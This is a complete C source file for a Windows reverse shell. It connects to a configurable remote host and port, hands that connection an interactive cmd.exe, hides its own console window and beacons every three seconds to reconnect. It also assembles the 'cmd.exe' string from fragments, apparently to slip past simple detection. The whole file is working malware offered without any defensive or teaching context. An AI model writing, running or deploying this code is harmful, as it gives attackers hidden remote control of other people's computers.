#include <winsock2.h>       //Socket Header
#include <windows.h>        //Win API Header
#include <ws2tcpip.h>       //TCP-IP Header

//C Header
#include <stdio.h>          //Input Output Header

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

#define RECONN_TIME 3000    //Beacon time

int STAT=1;

void shll(SOCKET Winsock){
    STARTUPINFO ips;
    PROCESS_INFORMATION psi;
    memset(&ips, 0, sizeof(ips));
    ips.cb=sizeof(ips);
    ips.dwFlags=STARTF_USESTDHANDLES;
    ips.hStdInput = ips.hStdOutput = ips.hStdError = (HANDLE)Winsock;
    char *myArray[4] = { "cM", "d.e", "X", "E" };
    char command[8] = "";
    snprintf( command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);
    CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ips, &psi);
    WaitForSingleObject(psi.hProcess,INFINITE); 
    TerminateProcess(psi.hProcess, 0);
    CloseHandle(psi.hThread);
    CloseHandle(psi.hProcess);
}

void connector(char *I, char *P){
    WSADATA wsaver;                       //required for socket initializing
    WSAStartup(MAKEWORD(2,2), &wsaver);   //check sockets compat w old version
    struct hostent *IPADDR;    
    IPADDR=gethostbyname(I);    
    SOCKET tcpsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
    sockaddr_in addr;
    addr.sin_family = AF_INET;    
    addr.sin_addr.s_addr = *(u_long *) IPADDR->h_addr_list[0];
    addr.sin_port = htons(atoi(P));
    if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
    }
    else {  //Enter here after a sucessful connection
        shll(tcpsock); //check this one, maybe not possible        
    }
    closesocket(tcpsock);
    WSACleanup();
}

int main(int argc, char *argv[])
{
    char a[256]="127.0.0.1"; //change this to accomodate your settings
    char p[256]="1234";      //change this to accomodate your settings
    if(argc==3) {
        strcpy(a,argv[1]);
        strcpy(p,argv[2]);
    }

    HWND stealth;       //Declare a window handle 
    AllocConsole();     //Allocate a new console
    stealth=FindWindowA("ConsoleWindowClass",NULL); //Find the previous Window handler and hide/show the window depending upon the next command    
    //ShowWindow(stealth,SW_SHOWNORMAL);  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
    ShowWindow(stealth,SW_HIDE);  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
    while(STAT!=0)    
    {
        if(STAT>1){
            Sleep(STAT);
            STAT=1;
        }
        else{
            connector(a, p);
            Sleep(RECONN_TIME);
        }       
    }    
    return 0;
}
